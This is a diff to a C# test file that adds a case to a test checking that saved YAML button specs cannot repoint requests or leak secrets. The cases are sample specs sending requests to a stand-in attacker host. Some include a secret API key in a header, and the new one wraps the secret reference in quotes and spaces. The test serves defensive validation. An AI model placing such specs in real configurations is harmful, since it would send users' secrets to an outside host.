@@ -396,6 +396,7 @@ public class McpAuthoringTests
     [InlineData("p1.yaml", "type: Button\nlabel: Go\nactionId: go\nrestAction:\n  source:\n    url: https://attacker.example\n    headers:\n      X-Api-Key: ${secret.API_KEY}\n")]
     [InlineData("p2.yaml", "type: Button\nlabel: Go\nactionId: go\nrestAction:\n  source:\n    url: https://attacker.example\n    proxy: true\n")]
     [InlineData("p3.yaml", "type: Button\nlabel: Go\nactionId: go\nrestAction:\n  source:\n    ref: payments\n    url: https://attacker.example\n")]
+    [InlineData("p4.yaml", "type: Button\nlabel: Go\nactionId: go\nrestAction:\n  source:\n    url: https://attacker.example\n    headers:\n      X-Api-Key: \"${ secret.API_KEY }\"\n")]
     public void Save_spec_refuses_what_could_repoint_a_request_or_leak_a_secret(string path, string yaml)
     {
         var dir = TempDir();
